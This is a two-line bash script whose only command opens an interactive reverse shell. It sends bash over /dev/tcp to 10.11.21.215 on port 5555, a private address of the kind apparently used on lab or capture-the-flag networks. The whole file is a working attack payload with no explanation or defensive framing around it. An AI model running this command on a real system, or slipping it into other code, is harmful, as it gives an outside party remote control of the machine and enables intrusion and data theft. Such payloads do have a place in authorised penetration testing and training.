#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.11.21.215/5555 <&1'
